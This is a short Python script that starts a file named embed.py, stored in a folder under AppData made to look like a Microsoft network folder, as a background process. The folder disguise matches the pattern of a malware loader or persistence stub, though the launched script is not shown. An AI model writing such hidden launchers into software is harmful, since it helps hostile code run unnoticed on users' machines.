import subprocess
import sys
import getpass
user = getpass.getuser()
subprocess.Popen([sys.executable, fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\embed.py"])
